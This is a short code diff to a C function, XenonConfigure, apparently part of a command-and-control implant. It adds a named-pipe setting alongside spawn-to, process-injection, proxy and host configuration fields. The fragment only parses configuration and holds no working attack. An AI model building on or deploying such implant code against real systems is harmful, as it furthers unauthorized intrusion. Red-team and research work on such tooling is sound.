@@ -26,6 +26,7 @@ VOID XenonConfigure()
     PARSER ParserConfig = { 0 };
     SIZE_T sizeUuid     = TASK_UUID_SIZE;
     SIZE_T pathLen      = 0;
+    SIZE_T pipeLen      = 0;
     SIZE_T keyLen       = 0;
     SIZE_T proxyLen     = 0;
     SIZE_T userLen      = 0;
@@ -54,7 +55,7 @@ VOID XenonConfigure()
     xenonConfig->failoverThreshold   = ParserGetInt32(&ParserConfig);
     // Process Injection Options
     xenonConfig->spawnto           = ParserStringCopy(&ParserConfig, &pathLen);                     // allocates
-
+    xenonConfig->pipename          = ParserStringCopy(&ParserConfig, &pipeLen);                     // allocates
 
     // Connection Hosts
     UINT32 NmbrOfHosts = ParserGetInt32(&ParserConfig);
